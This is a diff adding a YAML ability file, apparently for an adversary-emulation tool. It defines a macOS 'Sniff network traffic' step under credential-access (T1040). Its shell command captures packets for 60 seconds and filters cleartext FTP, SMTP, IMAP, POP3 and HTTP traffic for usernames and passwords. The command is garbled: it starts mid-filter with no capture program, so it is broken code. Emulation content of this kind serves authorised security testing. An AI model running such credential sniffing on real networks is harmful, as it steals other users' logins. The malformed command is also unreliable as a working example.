@@ -1,0 +1,20 @@
+id: 1b4fb81c-8090-426c-93ab-0a633e7a16a7
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags:
+    - Surveillance
+name: Sniff network traffic
+description: |
+  Spend 60 seconds sniffing all packets going in/out from this computer. The goal here is to learn something about
+  the computers that this one is talking to and specifically filter out usernames and/or passwords from unencrypted traffic.
+tactic: credential-access
+technique:
+  id: T1040
+  name: Network Sniffing
+platforms:
+  darwin:
+    sh:
+      command: |
+        http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 & sleep 60; kill $!
